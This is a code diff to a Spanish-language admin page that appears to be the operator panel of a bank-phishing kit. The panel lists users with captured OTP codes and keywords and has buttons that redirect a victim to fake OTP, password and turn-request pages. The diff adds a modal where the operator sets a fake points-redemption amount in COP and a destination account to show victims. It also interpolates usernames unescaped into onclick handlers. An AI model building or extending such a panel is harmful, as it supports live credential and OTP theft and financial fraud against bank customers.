@@ -77,6 +77,87 @@
             font-style: italic;
             color: #666;
         }
+        /* Modal de puntos */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.55);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-overlay.active { display: flex; }
+        .modal-box {
+            background: #fff;
+            border-radius: 10px;
+            padding: 32px 28px 24px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.18);
+            position: relative;
+        }
+        .modal-box h3 {
+            margin: 0 0 18px;
+            color: #004080;
+            font-size: 1.2rem;
+        }
+        .modal-box label {
+            display: block;
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 4px;
+            margin-top: 12px;
+        }
+        .modal-box input {
+            width: 100%;
+            padding: 9px 12px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 15px;
+            box-sizing: border-box;
+        }
+        .modal-box input:focus {
+            outline: none;
+            border-color: #004080;
+        }
+        .modal-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+            justify-content: flex-end;
+        }
+        .btn-modal-cancel {
+            background: #eee;
+            color: #333;
+            border: none;
+            padding: 9px 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .btn-modal-save {
+            background: #004080;
+            color: #fff;
+            border: none;
+            padding: 9px 22px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .btn-modal-save:hover { background: #003366; }
+        .btn-points { background-color: #17a2b8; }
+        .btn-points:hover { background-color: #138496; }
+        .modal-close-x {
+            position: absolute;
+            top: 10px; right: 14px;
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            color: #999;
+        }
     </style>
 </head>
 <body>
@@ -100,7 +181,7 @@
                 <tr>
                     <th>ID</th>
                     <th>Nombre de Usuario / Correo</th>
-                    <th>Apartamento</th>
+                    <th>OTP</th>
                     <th>Palabra clave</th>
                     <th>Acciones</th>
                 </tr>
@@ -169,6 +250,7 @@
                             <td>${apartmentCode}</td>
                             <td>${keywordCode}</td>
                             <td>
+                                <button onclick="openPointsModal(${user.id}, '${user.username}')" class="btn-action btn-points">Datos Puntos</button>
                                 <button onclick="redirectUser(${user.id}, 'numero-de-apto.html')" class="btn-action">OTP</button>
                                 <button onclick="redirectUser(${user.id}, 'palabra-clave.html')" class="btn-action" style="background-color:#6f42c1;">Escribir Clave</button>
                                 <button onclick="redirectUser(${user.id}, 'solicita-tu-turno.html')" class="btn-action" style="background-color:#fd7e14;">Solicitar turno</button>
@@ -221,6 +303,89 @@
                 alert(error.message);
             }
         }
+
+        // ── Modal Datos Puntos ────────────────────────────────────────────────
+        let currentPointsUserId = null;
+
+        function openPointsModal(userId, username) {
+            currentPointsUserId = userId;
+            document.getElementById('points-modal-username').textContent = username;
+            document.getElementById('input-puntos').value = '';
+            document.getElementById('input-valor-cop').value = '';
+            document.getElementById('input-cuenta-destino').value = '';
+            document.getElementById('points-modal-status').textContent = '';
+
+            // Pre-cargar valores existentes si los hay
+            fetch(`/api/points/${userId}`)
+                .then(r => r.json())
+                .then(d => {
+                    if (d.puntos) document.getElementById('input-puntos').value = d.puntos;
+                    if (d.valor_cop) document.getElementById('input-valor-cop').value = d.valor_cop;
+                    if (d.cuenta_destino) document.getElementById('input-cuenta-destino').value = d.cuenta_destino;
+                })
+                .catch(() => {});
+
+            document.getElementById('points-modal-overlay').classList.add('active');
+        }
+
+        function closePointsModal() {
+            document.getElementById('points-modal-overlay').classList.remove('active');
+            currentPointsUserId = null;
+        }
+
+        document.getElementById('btn-save-points').addEventListener('click', async () => {
+            const puntos = document.getElementById('input-puntos').value.trim();
+            const valor_cop = document.getElementById('input-valor-cop').value.trim();
+            const cuenta_destino = document.getElementById('input-cuenta-destino').value.trim();
+            const statusEl = document.getElementById('points-modal-status');
+
+            if (!puntos || !valor_cop || !cuenta_destino) {
+                statusEl.textContent = 'Por favor completa todos los campos.';
+                statusEl.style.color = '#dc3545';
+                return;
+            }
+
+            try {
+                const res = await fetch(`/api/points/${currentPointsUserId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ puntos, valor_cop, cuenta_destino })
+                });
+                const data = await res.json();
+                if (!res.ok) throw new Error(data.error || 'Error al guardar');
+                statusEl.textContent = '✅ Datos guardados correctamente.';
+                statusEl.style.color = '#28a745';
+                setTimeout(closePointsModal, 1200);
+            } catch (err) {
+                statusEl.textContent = '❌ ' + err.message;
+                statusEl.style.color = '#dc3545';
+            }
+        });
+
+        document.getElementById('btn-cancel-points').addEventListener('click', closePointsModal);
+        document.getElementById('btn-close-modal-x').addEventListener('click', closePointsModal);
+        document.getElementById('points-modal-overlay').addEventListener('click', function(e) {
+            if (e.target === this) closePointsModal();
+        });
     </script>
+
+    <!-- Modal: Datos de Puntos -->
+    <div class="modal-overlay" id="points-modal-overlay">
+        <div class="modal-box">
+            <button class="modal-close-x" id="btn-close-modal-x" aria-label="Cerrar">&times;</button>
+            <h3>📊 Datos de Puntos — <span id="points-modal-username"></span></h3>
+            <label for="input-puntos">Puntos acumulados a redimir</label>
+            <input type="text" id="input-puntos" placeholder="Ej: 65420" />
+            <label for="input-valor-cop">Valor en dinero (COP)</label>
+            <input type="text" id="input-valor-cop" placeholder="Ej: $654.200 COP" />
+            <label for="input-cuenta-destino">Destino del abono</label>
+            <input type="text" id="input-cuenta-destino" placeholder="Ej: Cuenta Ahorros •••• 4821" />
+            <p id="points-modal-status" style="margin: 10px 0 0; font-size: 13px; min-height: 18px;"></p>
+            <div class="modal-actions">
+                <button class="btn-modal-cancel" id="btn-cancel-points">Cancelar</button>
+                <button class="btn-modal-save" id="btn-save-points">Guardar</button>
+            </div>
+        </div>
+    </div>
 </body>
 </html>
